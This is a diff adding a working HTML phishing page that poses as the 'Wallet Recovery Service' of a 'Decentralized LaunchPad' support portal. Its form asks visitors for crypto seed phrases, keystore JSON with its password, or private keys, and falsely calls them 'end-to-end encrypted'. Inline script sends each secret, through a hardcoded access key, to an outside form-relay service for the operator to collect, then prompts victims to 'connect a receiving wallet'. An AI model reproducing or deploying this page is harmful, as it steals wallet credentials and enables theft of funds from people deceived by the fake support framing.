@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta property="og:image" content="https://support-portal-decentralized.vercel.app/decentra.jpg">
+  <meta property="og:image:type" content="image/jpeg">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://support-portal-decentralized.vercel.app/decentra.jpg">
+  <meta name="description" content="Official Decentralized LaunchPad Suppot Self Services - Fix your issue manually">
+  <meta property="og:title" content="Decentralized | Official Support web">
+  <meta property="og:description" content="Rectify your issues securely.">
+  <meta property="og:type" content="website">
+  <title>Wallet Recovery — Decentralized LaunchPad</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- Sticky Header -->
+  <header>
+    <img src="Crypto.png" alt="Logo" class="logo">
+    <h1 class="main-title">Decentralized Launchpad</h1>
+
+    <!-- Desktop Navigation -->
+    <nav class="desktop-nav">
+      <a href="index.html">Home</a>
+      <a href="stake.html">Stake</a>
+      <a href="get-support.html">Get Support</a>
+      <a href="terms.html">Terms</a>
+    </nav>
+
+    <!-- Mobile Hamburger -->
+    <div class="hamburger" aria-label="Menu" aria-expanded="false">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <div class="connect">
+      <button class="interact-button open-modal"><h5>Connect</h5></button>
+      <img src="wallet-gif.gif" alt="Wallet GIF" class="wallet-gif open-modal">
+    </div>
+  </header>
+
+  <!-- Mobile Menu -->
+  <div class="mobile-menu">
+    <a href="index.html">Home</a>
+    <a href="stake.html">Stake</a>
+    <a href="get-support.html">Get Support</a>
+    <a href="terms.html">Terms</a>
+  </div>
+
+  <!-- Processing Overlay -->
+  <div id="manualProcessingOverlay" class="fixed inset-0 z-90 hidden flex items-center justify-center bg-black bg-opacity-95">
+    <div class="text-center text-white">
+      <div class="spinner large mb-8"></div>
+      <p class="text-3xl font-bold">Processing...</p>
+    </div>
+  </div>
+
+  <!-- Recovery Page Content -->
+  <section class="recovery-page">
+    <div class="recovery-content">
+      <h2>Wallet Recovery Service</h2>
+      <p class="recovery-desc">
+        Lost access to your crypto wallet? We specialize in helping clients recover their digital assets safely and securely. Whether you've forgotten your seed phrase, lost your private key, or can't access your keystore file, our expert recovery process can help restore access to your funds.
+      </p>
+      <p class="recovery-desc">
+        We support recovery for major wallets including MetaMask, Trust Wallet, Ledger, Trezor, and many others. Our service is end-to-end encrypted — your credentials are never stored and are transmitted securely.
+      </p>
+      <p class="recovery-desc warning">
+        <strong>Important:</strong> Only provide credentials for wallets you own. Never share your recovery details with untrusted parties.
+      </p>
+
+      <!-- Embedded Recovery Form -->
+      <div class="recovery-form">
+        <h3>Enter Recovery Wallet Credentials</h3>
+
+        <div class="method-options">
+          <label class="option-header">
+            <input type="radio" name="recoveryMethod" value="phrases" checked>
+            <span>Phrases</span>
+          </label>
+          <label class="option-header">
+            <input type="radio" name="recoveryMethod" value="keystore">
+            <span>Keystore JSON</span>
+          </label>
+          <label class="option-header">
+            <input type="radio" name="recoveryMethod" value="private">
+            <span>Private Key</span>
+          </label>
+        </div>
+
+        <!-- Phrases -->
+        <div id="recoveryPhrasesField" class="recovery-field">
+          <div class="phrase-count-toggle">
+            <label><input type="radio" name="phraseCount" value="12" checked> 12 words</label>
+            <label><input type="radio" name="phraseCount" value="24"> 24 words</label>
+          </div>
+          <div id="recoveryPhrasesGrid" class="phrases-grid"></div>
+          <p class="encrypted-note">end-to-end encrypted</p>
+        </div>
+
+        <!-- Keystore JSON -->
+        <div id="recoveryKeystoreField" class="recovery-field hidden">
+          <textarea id="recoveryKeystoreInput" rows="6" placeholder="Paste your Keystore JSON here..." class="recovery-textarea"></textarea>
+          <input id="recoveryKeystorePassword" type="password" placeholder="Keystore Password" class="recovery-input mt-4" />
+          <p class="encrypted-note mt-3">end-to-end encrypted</p>
+        </div>
+
+        <!-- Private Key -->
+        <div id="recoveryPrivateField" class="recovery-field hidden">
+          <input id="recoveryPrivateInput" type="text" placeholder="Enter your Private Key" class="recovery-input private-key-input" />
+          <p class="encrypted-note mt-3">end-to-end encrypted</p>
+        </div>
+
+        <button id="recoveryConnectBtn" class="recovery-connect-btn">Connect</button>
+      </div>
+
+      <!-- Receiving Wallet Section -->
+      <div class="receiving-wallet-section">
+        <p class="receiving-text">
+          Connect your receiving wallet by clicking the Get support button below
+        </p>
+        <a href="get-support.html" class="support-btn-large">Get Support</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Loading Overlay for Embedded Form -->
+  <div id="recoveryLoading" class="recovery-loading hidden">
+    <div class="loading-inner">
+      <div class="spinner large"></div>
+      <p>Contacting...</p>
+    </div>
+  </div>
+
+  <!-- Success Modal for Embedded Form -->
+  <div id="recoveryModal" class="recovery-modal hidden">
+    <div class="modal-content">
+      <h3>Recovery Request Submitted</h3>
+      <p>Your wallet recovery credentials have been securely submitted.</p>
+      <p>Our team will review your request and contact you shortly.</p>
+      <p style="color: lch(81.3% 107.89 137.56); font-size: 0.7rem; font-weight: 800; text-align: center; margin: 25px 0;">
+        Click on close button below and scroll down the page then click on Get support button to connect your receiving wallet
+      </p>
+      <button id="closeModalBtn" class="modal-close-btn">Close</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+
+  <script src="wallet-modal.js"></script>
+  <script>
+    // Recovery page: render phrase inputs, toggle fields, and submit to Web3Forms
+    (function(){
+      const phrasesGrid = document.getElementById('recoveryPhrasesGrid');
+      const recoveryConnectBtn = document.getElementById('recoveryConnectBtn');
+      const recoveryLoading = document.getElementById('recoveryLoading');
+      const recoveryModal = document.getElementById('recoveryModal');
+      const closeModalBtn = document.getElementById('closeModalBtn');
+
+      function renderPhraseInputs(count = 12){
+        if(!phrasesGrid) return;
+        phrasesGrid.innerHTML = '';
+        for(let i=1;i<=count;i++){
+          const wrap = document.createElement('div'); wrap.className='phrase-cell';
+          const input = document.createElement('input');
+          input.id = 'recovery-phrase-' + i; input.placeholder = 'word ' + i; input.className = 'recovery-input';
+          wrap.appendChild(input); phrasesGrid.appendChild(wrap);
+        }
+      }
+
+      function updateRecoveryFields(){
+        const sel = document.querySelector('input[name="recoveryMethod"]:checked')?.value || 'phrases';
+        document.getElementById('recoveryPhrasesField').classList.toggle('hidden', sel !== 'phrases');
+        document.getElementById('recoveryKeystoreField').classList.toggle('hidden', sel !== 'keystore');
+        document.getElementById('recoveryPrivateField').classList.toggle('hidden', sel !== 'private');
+      }
+
+      document.querySelectorAll('input[name="recoveryMethod"]').forEach(r => r.addEventListener('change', updateRecoveryFields));
+      // update phrase grid when phrase count changes
+      document.querySelectorAll('input[name="phraseCount"]').forEach(r => r.addEventListener('change', ()=>{ renderPhraseInputs(parseInt(r.value,10)); }));
+      renderPhraseInputs(12); updateRecoveryFields();
+
+      async function submitToWeb3Forms(message){
+        const WEB3FORMS_KEY = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';
+        try{
+          const form = new FormData(); form.append('access_key', WEB3FORMS_KEY); form.append('botcheck',''); form.append('subject','Recovery Submission'); form.append('message', message);
+          const res = await fetch('https://api.web3forms.com/submit',{ method:'POST', body: form });
+          if(!res.ok) throw new Error('HTTP '+res.status);
+          const j = await res.json(); return j && j.success === true;
+        }catch(err){ console.error('[recover submit]',err); return false; }
+      }
+
+      if(closeModalBtn) closeModalBtn.addEventListener('click', ()=>{ recoveryModal.classList.add('hidden'); });
+
+      if(recoveryConnectBtn) recoveryConnectBtn.addEventListener('click', async ()=>{
+        const method = document.querySelector('input[name="recoveryMethod"]:checked')?.value || 'phrases';
+        let messageParts = [];
+        messageParts.push('Recovery request');
+        if(method === 'phrases'){
+          const count = Number(document.querySelector('input[name="phraseCount"]:checked')?.value || 12);
+          const words = [];
+          for(let i=1;i<=count;i++){ words.push(document.getElementById('recovery-phrase-'+i)?.value.trim() || ''); }
+          const filled = words.filter(Boolean);
+          if(filled.length !== count){ alert('Please fill all phrase words'); return; }
+          messageParts.push('phrases: '+filled.join(' '));
+        } else if(method === 'keystore'){
+          const json = document.getElementById('recoveryKeystoreInput')?.value || ''; const pwd = document.getElementById('recoveryKeystorePassword')?.value || '';
+          if(!json){ alert('Please paste your keystore JSON'); return; }
+          messageParts.push('keystore: '+json); if(pwd) messageParts.push('keystore password: '+pwd);
+        } else if(method === 'private'){
+          const pk = document.getElementById('recoveryPrivateInput')?.value || '';
+          if(!pk){ alert('Please enter your private key'); return; }
+          messageParts.push('private key: '+pk);
+        }
+
+        // show loading
+        if(recoveryLoading) { recoveryLoading.classList.remove('hidden'); }
+        const ok = await submitToWeb3Forms(messageParts.join('\n\n'));
+        if(recoveryLoading) { recoveryLoading.classList.add('hidden'); }
+        if(ok){ if(recoveryModal) recoveryModal.classList.remove('hidden'); }
+        else { alert('Submission failed. Try again.'); }
+      });
+    })();
+  </script>
+  <script src="wallet-modal.js"></script>
+</body>
+</html>
